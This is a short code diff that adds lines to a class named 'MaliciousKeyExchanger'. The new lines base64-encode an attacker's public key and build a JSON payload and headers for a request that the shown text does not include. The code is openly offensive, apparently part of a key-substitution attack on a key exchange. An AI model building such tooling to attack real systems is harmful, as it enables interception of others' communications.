@@ -30,4 +30,8 @@ class MaliciousKeyExchanger:
 
         # Convert the attacker's public key to a format suitable for transmission
         pem_public_key = self.serialize_public_key(attacker_public_key)
-        
+
+        # Craft the payload and send the request
+        encoded_key = base64.b64encode(pem_public_key).decode()
+        payload = {"key": encoded_key}
+        headers = {"Content-Type": "application/json"}
